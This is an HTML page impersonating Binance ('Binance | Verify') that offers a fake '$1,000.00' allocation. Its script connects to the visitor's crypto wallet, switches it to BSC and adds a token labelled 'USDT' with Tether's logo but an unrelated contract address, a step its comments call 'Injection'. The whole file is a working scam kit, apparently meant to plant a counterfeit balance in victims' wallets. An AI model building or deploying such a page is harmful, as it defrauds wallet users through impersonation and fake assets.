<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Binance | Verify</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --b-yellow: #F3BA2F; --bg: #0b0e11; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #1e2329; border-radius: 16px; padding: 30px; width: 320px; text-align: center; border: 1px solid #2b3139; }
        .amount { font-size: 32px; font-weight: 800; margin: 20px 0; }
        .btn { background: var(--b-yellow); color: #000; border: none; width: 100%; padding: 15px; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; }
        #status { font-size: 10px; color: var(--b-yellow); margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://raw.githubusercontent.com/binance-chain/assets/master/blockchains/binance/info/logo.png" width="50">
    <div style="color: #848e9c; font-size: 12px; margin-top: 10px;">ALLOCATION READY</div>
    <div class="amount">$1,000.00</div>
    <button class="btn" id="actionBtn">CLAIM ASSET</button>
    <div id="status">READY</div>
</div>

<script>
    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    const btn = document.getElementById('actionBtn');
    const status = document.getElementById('status');

    // Logic 1: Detect Provider
    const getProvider = () => window.trustwallet || window.ethereum;

    async function handle() {
        const provider = getProvider();

        // Agar hum wallet se bahar hain (Chrome mein)
        if (!provider) {
            status.innerText = "OPENING WALLET...";
            // Sirf ek baar redirect
            const dappUrl = window.location.href.replace("https://", "");
            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappUrl;
            return;
        }

        // AGAR HUM ANDAR HAIN (DApp Browser)
        try {
            status.innerText = "CONNECTING...";
            await provider.request({ method: 'eth_requestAccounts' });

            // Switch Network
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (e) => {
                if (e.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{ chainId: '0x38', chainName: 'BSC', rpcUrls: ['https://bsc-dataseed.binance.org/'], nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18} }]
                    });
                }
            });

            // Injection (The "Baki students" Method)
            status.innerText = "INJECTING...";
            const added = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
                },
            });

            if (added) status.innerText = "SUCCESSFUL";

        } catch (err) {
            status.innerText = "REJECTED";
        }
    }

    btn.addEventListener('click', handle);

    // Auto-Run if inside wallet to prevent loop
    window.onload = () => {
        if (getProvider()) {
            btn.innerText = "CONFIRM ADD ASSET";
            status.innerText = "SYNCED WITH WALLET";
            // Optional: handle(); // Isay auto-trigger karne ke liye uncomment karein
        }
    };
</script>
</body>
</html>
